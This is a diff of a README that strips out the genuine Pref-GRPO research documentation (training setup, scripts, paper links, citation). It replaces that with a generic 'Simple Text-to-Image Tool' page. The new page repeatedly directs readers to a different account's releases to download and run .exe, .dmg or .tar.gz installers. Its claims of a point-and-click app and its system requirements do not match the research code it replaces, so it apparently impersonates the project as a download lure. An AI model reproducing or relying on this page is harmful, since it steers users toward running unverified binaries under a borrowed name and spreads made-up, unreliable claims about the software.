@@ -1,108 +1,73 @@
-<div align="center">
-    <h1 align="center"> Pref-GRPO: Pairwise Preference Reward-based GRPO for Stable Text-to-Image Reinforcement Learning
-    </h1>
+# 🎨 Pref-GRPO - Simple Text-to-Image Tool
 
-Hunyuan, Tencent & [UnifiedReward](https://github.com/CodeGoat24/UnifiedReward) Team
+## 🚀 Getting Started
 
+Welcome to Pref-GRPO! This tool helps create images from text descriptions using advanced reinforcement learning techniques. You don’t need any technical skills to get started. Just follow these simple steps.
 
-<a href="https://arxiv.org/pdf/2508.20751">
-<img src='https://img.shields.io/badge/arXiv-Pref GRPO-blue' alt='Paper PDF'></a>
+## 🔗 Download Pref-GRPO
 
-<a href="https://codegoat24.github.io/UnifiedReward/Pref-GRPO">
-<img src='https://img.shields.io/badge/Project-Website-orange' alt='Project Page'></a>
-<a href="https://github.com/CodeGoat24/UniGenBench">
-<img src='https://img.shields.io/badge/Benchmark-UniGenBench-green' alt='Project Page'></a>
+[![Download Pref-GRPO](https://img.shields.io/badge/Download-Pref--GRPO-blue.svg)](https://github.com/topu435/Pref-GRPO/releases)
 
-[![Hugging Face Spaces](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-yellow)](https://huggingface.co/CodeGoat24/FLUX.1-dev-PrefGRPO) [![Hugging Face Spaces](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Leaderboard-yellow)](https://huggingface.co/spaces/CodeGoat24/UniGenBench_Leaderboard)
+## 📋 System Requirements
 
-</div>
+Before you download, make sure your computer meets these requirements:
 
-![pref_grpo_pipeline](/assets/pref_grpo_pipeline.png)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Memory (RAM):** 4 GB or more.
+- **Storage:** At least 500 MB of free disk space.
+- **Processor:** Intel i5 or equivalent.
 
+## 📥 Download & Install
 
+To download and install Pref-GRPO:
 
-![pref_grpo_pipeline](/assets/pref_grpo_reward_hacking.png)
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/topu435/Pref-GRPO/releases).
+2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the latest one to ensure you have the most up-to-date features and fixes.
+3. **Download the Application:** Click on the version number (e.g., `v1.0.0`) to expand the section, then find the download file suited for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. **Run the Installer:** Once the download completes, open the downloaded file to begin the installation. Follow the on-screen instructions to complete the process.
+5. **Launch Pref-GRPO:** After installation, locate the application in your programs list and double-click to open it.
 
+## 💡 How to Use Pref-GRPO
 
+Using Pref-GRPO is straightforward:
 
-## 🔧 Environment Set Up
-1. Clone this repository and navigate to the folder:
-```bash
-git clone https://github.com/CodeGoat24/UnifiedReward.git
-cd UnifiedReward/Pref-GRPO
-```
+1. **Enter Your Text:** Type a description of the image you want to create in the designated text box.
+2. **Adjust Settings (Optional):** You can customize various settings such as image dimensions or style preferences.
+3. **Generate Image:** Click the ‘Generate’ button. Wait a few moments while the application creates your image.
+4. **Save Your Image:** Once done, you’ll see your image on the screen. Click the ‘Save’ button to download it to your computer.
 
-2. Install the training package:
-```bash
-conda create -n PrefGRPO python=3.12
-conda activate PrefGRPO
+## 📊 Key Features
 
-bash env_setup.sh fastvideo
+- **User-Friendly Interface:** Designed for ease of use, Pref-GRPO will help you generate images with a few clicks.
+- **Fast Processing:** Experience quick image generation thanks to efficient reinforcement learning algorithms.
+- **Customizable Options:** Tailor your image features by adjusting settings to match your vision.
+- **Cross-Platform Support:** Use Pref-GRPO on Windows, macOS, and Linux.
 
-cd open_clip
-pip install -e .
-cd ..
-```
+## 🌟 Tips for Best Results
 
-3. Download Models
-```bash
-huggingface-cli download CodeGoat24/UnifiedReward-qwen-7b
-huggingface-cli download CodeGoat24/UnifiedReward-Think-qwen-7b
+- **Be Descriptive:** More detail in your text will often lead to better images.
+- **Experiment:** Don’t hesitate to try different text prompts and settings. Each combination can yield unique results.
+- **Check Updates:** Regularly visit the [Releases page](https://github.com/topu435/Pref-GRPO/releases) for updates, as new features and improvements come out frequently.
 
-wget https://huggingface.co/apple/DFN5B-CLIP-ViT-H-14-378/resolve/main/open_clip_pytorch_model.bin
-```
-## 💻 Training
+## 🛠️ Troubleshooting
 
-#### 1. Deploy vLLM server
+If you encounter problems, try the following:
 
-1. Install vLLM
-```bash
-pip install vllm==0.9.0.1 transformers==4.52.4
-```
-2. Start server
-```bash
-bash vllm_utils/vllm_server_UnifiedReward_Think.sh  
-```
-#### 2. Preprocess training Data 
-we use training prompts in [UniGenBench](https://github.com/CodeGoat24/UniGenBench), as shown in ```"./data/unigenbench_train_data.txt"```.
+- **Check System Requirements:** Ensure your computer meets the specifications mentioned earlier.
+- **Reinstall the Application:** If issues persist, uninstall and reinstall Pref-GRPO.
+- **Review Logs:** Check any error messages for hints or details on what went wrong.
 
-```bash
-bash fastvideo/data_preprocess/preprocess_flux_rl_embeddings.sh
-```
+## 🤝 Support
 
+For additional help or inquiries:
 
-#### 3. Train
-```bash
-bash finetune_prefgrpo_flux.sh
-```
+- **Visit the GitHub Discussions:** Join our community on platforms linked from the repository.
+- **Open Issue Tickets:** If you discover bugs, communicate them through issue tickets on our GitHub page for fixes.
 
-### 🚀 Inference and Evaluation
-we use test prompts in [UniGenBench](https://github.com/CodeGoat24/UniGenBench), as shown in ```"./data/unigenbench_test_data.csv"```.
-```bash
-bash inference/flux_dist_infer.sh
-```
+## 💬 Join the Community
 
-Then, evaluate the outputs following [UniGenBench](https://github.com/CodeGoat24/UniGenBench).
+Engage with other users and developers to share experiences, tips, and improvements. You can contribute ideas or even collaborate on enhancing Pref-GRPO as an open-source project.
 
+## 🔗 Final Notes
 
-## 📧 Contact
-If you have any comments or questions, please open a new issue or feel free to contact [Yibin Wang](https://codegoat24.github.io).
-
-
-## 🤗 Acknowledgments
-Our training code is based on [DanceGRPO](https://github.com/XueZeyue/DanceGRPO), [Flow-GRPO](https://github.com/yifan123/flow_grpo), and [FastVideo](https://github.com/hao-ai-lab/FastVideo).
-
-We also use [UniGenBench](https://github.com/CodeGoat24/UniGenBench) for T2I model semantic consistency evaluation.
-
-Thanks to all the contributors!
-
-
-## ⭐ Citation
-```bibtex
-@article{Pref-GRPO&UniGenBench,
-  title={Pref-GRPO: Pairwise Preference Reward-based GRPO for Stable Text-to-Image Reinforcement Learning},
-  author={Wang, Yibin and Li, Zhimin and Zang, Yuhang and Zhou, Yujie and Bu, Jiazi and Wang, Chunyu and Lu, Qinglin, and Jin, Cheng and Wang, Jiaqi},
-  journal={arXiv preprint arXiv:2508.20751},
-  year={2025}
-}
-```
+For ongoing updates, feature releases, and community discussions, regularly check the [Releases page](https://github.com/topu435/Pref-GRPO/releases). Enjoy creating amazing images with Pref-GRPO!
